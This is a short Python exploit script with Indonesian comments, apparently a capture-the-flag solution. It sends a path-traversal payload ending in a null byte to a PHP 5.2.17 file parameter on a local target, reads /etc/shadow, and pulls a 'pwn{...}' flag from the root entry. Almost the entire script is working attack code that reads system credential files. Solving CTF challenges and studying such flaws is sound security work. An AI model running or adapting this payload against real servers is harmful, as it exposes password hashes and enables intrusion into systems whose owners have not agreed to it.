#!/usr/bin/env python3
import requests
import re

# Target URL
URL = "http://localhost:1337"

def exploit():
    print(f"[*] Target: {URL}")
    print("[*] Vulnerability: PHP 5.2.17 Null Byte Poisoning")
    
    # Target file: /etc/shadow (Isi password hash user Linux)
    # Lokasi ini kita dapet dari hasil 'grep' manual di server.
    target_file = "/etc/shadow"
    
    # Payload:
    # 1. Traversal: ../../../../ buat naik ke root
    # 2. Target: etc/shadow
    # 3. Null Byte (\x00): Buat memotong ekstensi .mp4 yang dipaksa sama kodingan PHP-nya
    payload = f"../../../../{target_file}\x00"
    
    print(f"[*] Sending Payload: {target_file} + %00")
    
    try:
        # Kirim Request dengan payload Null Byte
        r = requests.get(URL, params={'file': payload})
        
        # Cek apakah file kebaca (Status 200)
        if r.status_code == 200 and "File not found" not in r.text:
            print("[+] Injection Successful! /etc/shadow retrieved.")
            print("-" * 50)
            
            # Parsing output (biasanya kecampur HTML <pre>)
            content = r.text
            match = re.search(r'<pre>(.*?)</pre>', content, re.DOTALL)
            if match:
                content = match.group(1).strip()
            
            # Tampilkan baris Root yang mengandung flag
            # Format: root:pwn{...}:...
            found = False
            for line in content.splitlines():
                if "root" in line and "pwn{" in line:
                    print(f"[+] Raw Entry Found:\n    {line}")
                    
                    # Extract Flag pake Regex
                    flag = re.search(r'pwn\{.*?\}', line)
                    if flag:
                        print("-" * 50)
                        print(f"\n[!!!] JACKPOT! FLAG: {flag.group(0)}\n")
                        found = True
                        break
            
            if not found:
                print("[-] /etc/shadow opened, but flag not found in root entry.")
                print("Raw Content:")
                print(content[:500]) # Print sebagian buat debug
                
        else:
            print(f"[-] Failed. Status: {r.status_code}")
            
    except Exception as e:
        print(f"[-] Connection Error: {e}")

if __name__ == "__main__":
    exploit()
